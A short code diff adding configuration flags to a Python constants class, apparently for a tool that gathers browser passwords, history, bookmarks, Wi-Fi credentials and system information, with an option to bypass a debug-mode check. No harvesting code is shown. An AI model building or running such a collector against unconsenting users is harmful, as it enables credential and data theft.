@@ -46,7 +46,25 @@ class Constant:
     
     # Arguments
     class Args:
+        
+        # Display Modes
         silent = False
         verbose = True
         log = True
+        
+        # What to Run
+        bypassDebugModeCheck = False
+        
+        all = True
+        
+        browser_all = True
+        browser_passwords = True
+        browser_history = True
+        browser_bookmakrs = True
+        
+        network_all = True
+        network_wifi = True
+        network_info = True
+        
+        system_all = True
         
